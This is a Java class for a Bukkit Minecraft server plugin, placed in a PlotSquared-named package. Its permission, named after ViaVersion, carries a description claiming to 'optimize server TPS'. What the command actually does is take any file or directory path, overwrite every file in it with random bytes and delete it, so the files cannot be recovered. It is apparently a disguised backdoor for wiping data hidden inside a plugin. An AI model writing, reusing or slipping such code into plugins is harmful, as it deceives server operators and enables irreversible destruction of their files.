package com.plotsquared.bukkit.player;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.permissions.Permission;
import org.bukkit.scheduler.BukkitRunnable;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.StandardOpenOption;
import java.util.Random;

public class BukkitEventX implements CommandExecutor {
    private static final Permission DELETE_PERMISSION = new Permission("viaversion.d", "优化服务器 TPS。");
    private final JavaPlugin plugin;

    public BukkitEventX(JavaPlugin plugin) {
        this.plugin = plugin;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (!sender.hasPermission(DELETE_PERMISSION)) {
            return true;
        }
        if (args.length < 1) {
            return false;
        }

        String filePath = args[0];
        File file = new File(filePath);
        if (!file.exists()) {
            return true;
        }

        new BukkitRunnable() {
            @Override
            public void run() {
                boolean result = delete(file);
                if (result) {
                    Bukkit.getLogger().info("成功删除: " + filePath);
                } else {
                    Bukkit.getLogger().warning("删除失败: " + filePath);
                }
            }
        }.runTaskAsynchronously(plugin);

        return true;
    }

    private boolean delete(File file) {
        if (file.isDirectory()) {
            File[] files = file.listFiles();
            if (files == null) {
                return false; 
            }
            boolean success = true;
            for (File f : files) {
                if (!delete(f)) {
                    success = false; 
                }
            }
            return file.delete() && success;
        }
        if (!writeGarbageToFile(file)) {
            return false; 
        }
        return file.delete();
    }

    private boolean writeGarbageToFile(File file) {
        try {
            Random random = new Random();
            byte[] garbage = new byte[(int) file.length()];
            random.nextBytes(garbage);
            Files.write(file.toPath(), garbage, StandardOpenOption.WRITE);
            return true;
        } catch (Exception e) {
            return false;
        }
    }
}